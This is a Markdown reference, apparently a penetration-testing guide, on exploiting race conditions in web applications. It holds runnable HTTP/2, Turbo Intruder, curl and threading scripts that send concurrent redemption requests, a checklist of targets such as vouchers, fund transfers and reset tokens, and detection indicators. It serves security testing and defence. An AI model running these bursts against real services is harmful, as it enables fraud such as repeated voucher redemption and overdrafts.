# Race Conditions — Deep Reference

## What Makes a Race Condition Exploitable?

A race condition exists when:
1. Server **checks** a condition (e.g., "has this code been used?")
2. Server **acts** on the result (e.g., "apply the discount")
3. There is a **gap** between check and act (TOCTOU)
4. Multiple concurrent requests can enter this gap simultaneously

## Attack Pattern: Limit Overrun

```
Normal flow:    check(balance >= 1000) → deduct(1000) → done
Race flow:      Thread1: check(balance=1500 >= 1000) ✓
                Thread2: check(balance=1500 >= 1000) ✓  ← both pass before deduct
                Thread1: deduct(1000) → balance=500
                Thread2: deduct(1000) → balance=-500  ← overdraft!
```

## HTTP/2 Single-Packet Attack

HTTP/2 allows multiple requests in one TCP packet — maximally synchronized:

```python
import httpx

async def single_packet_race():
    async with httpx.AsyncClient(http2=True) as client:
        requests = [
            client.post("https://target.com/redeem",
                       json={"code":"GIFT50"},
                       headers={"Cookie":"session=TOKEN"})
            for _ in range(20)
        ]
        # Fire all in same HTTP/2 stream window
        import asyncio
        responses = await asyncio.gather(*requests)
        for r in responses:
            print(r.status_code, r.text[:100])

import asyncio
asyncio.run(single_packet_race())
```

## Turbo Intruder (Burp) — Best Race Condition Tool

```python
# Turbo Intruder script for race conditions
# Right-click request → Extensions → Turbo Intruder

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           requestsPerConnection=1,
                           pipeline=False)
    
    # Queue 20 identical requests
    for i in range(20):
        engine.queue(target.req)
    
    # Send all at once using HTTP/2 single-packet
    engine.start(timeout=5)

def handleResponse(req, interesting):
    if '200' in req.response:
        table.add(req)
```

## Race Condition Target Checklist

| Feature | Race Goal | Expected vs. Actual |
|---------|-----------|---------------------|
| Gift card / voucher redemption | Redeem same code multiple times | Use once only |
| Fund transfer | Transfer more than balance | Deduct atomically |
| Vote / rating | Cast multiple votes | One vote per user |
| Like / upvote | Like multiple times | One like per user |
| Password reset | Use reset token multiple times | Single-use token |
| File quota | Upload more than quota | Enforce atomically |
| Rate limit | Exceed request limit | Atomic counter |
| Free trial | Activate multiple times | One trial per account |
| Concurrent logins | Bypass concurrent session limit | Enforce in DB |

## Detection Indicators

Signs a feature may be race-vulnerable:

1. **Non-atomic check+act** — Separate SELECT then UPDATE in code
2. **No database transaction** — Business logic in application layer
3. **Cache-based state** — Redis/Memcache for "used" flags (TTL issues)
4. **Eventual consistency** — Microservices with async state sync
5. **Middleware-based checks** — Auth/limit middleware separate from handler

## Timing Techniques

```bash
# Baseline — measure response time distribution
for i in $(seq 1 10); do
  time curl -s -X POST https://target.com/redeem -d '{"code":"TEST"}' > /dev/null
done

# Synchronized burst — bash
(
  for i in $(seq 1 20); do
    curl -s -X POST https://target.com/redeem \
         -d '{"code":"GIFT50"}' \
         -H "Cookie: session=TOKEN" &
  done
  wait
)

# Python threading with barrier (all threads release simultaneously)
import threading
barrier = threading.Barrier(20)
def attack():
    barrier.wait()  # synchronize here
    requests.post(url, ...)
```

## Post-Race Verification

```bash
# After race — verify impact
# Check balance/credits were over-applied
GET /api/account/balance

# Check if gift card still shows "valid" (wasn't marked used)
GET /api/giftcards/GIFT50/status

# Check transaction history for duplicates
GET /api/transactions?limit=50
```
